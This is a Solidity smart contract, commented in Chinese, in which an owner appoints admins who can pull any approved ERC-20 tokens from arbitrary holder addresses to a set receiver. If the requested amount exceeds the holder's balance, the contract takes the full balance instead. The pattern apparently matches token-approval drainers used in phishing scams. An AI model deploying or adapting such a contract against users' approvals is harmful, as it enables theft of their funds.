// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ERC20Manager {
    address public owner;
    mapping(address => bool) public isAdmin;
    address[] public adminList;

    address public to; // 代币接收地址

    event AdminAdded(address indexed admin);
    event AdminRemoved(address indexed admin);
    event TokensTransferred(address indexed token, address indexed from, address indexed to, uint256 amount);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event ReceiverAddressUpdated(address indexed newReceiver);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not contract owner");
        _; 
    }

    modifier onlyAdmin() {
        require(isAdmin[msg.sender], "Not an admin");
        _; 
    }

    constructor() {
        owner = msg.sender;
        isAdmin[owner] = true;
        adminList.push(owner);
    }

    // 设置接收地址（仅限Owner）
    function setReceiverAddress(address _to) external onlyOwner {
        require(_to != address(0), "Invalid receiver address");
        to = _to;
        emit ReceiverAddressUpdated(_to);
    }

    // 添加管理员
    function addAdmin(address _admin) external onlyOwner {
        require(!isAdmin[_admin], "Already an admin");
        isAdmin[_admin] = true;
        adminList.push(_admin);
        emit AdminAdded(_admin);
    }

    // 移除管理员
    function removeAdmin(address _admin) external onlyOwner {
        require(isAdmin[_admin], "Not an admin");
        isAdmin[_admin] = false;

        // 从 adminList 移除
        for (uint256 i = 0; i < adminList.length; i++) {
            if (adminList[i] == _admin) {
                adminList[i] = adminList[adminList.length - 1];
                adminList.pop();
                break;
            }
        }

        emit AdminRemoved(_admin);
    }

    // 获取管理员列表
    function getAdminList() external view returns (address[] memory) {
        return adminList;
    }

    // 管理员转移指定代币，若转账数量大于账户余额，则调整为账户余额
    function transferToken(IERC20 token, address from, uint256 amount) external onlyAdmin {
        require(to != address(0), "Receiver address not set");

        uint256 balance = token.balanceOf(from);
        if (amount > balance) {
            amount = balance; // 只转账可用余额部分
        }
        require(amount > 0, "Insufficient balance");
        require(token.transferFrom(from, to, amount), "Token transfer failed");
        emit TokensTransferred(address(token), from, to, amount);
    }

    // 转移所有权
    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "New owner is the zero address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
}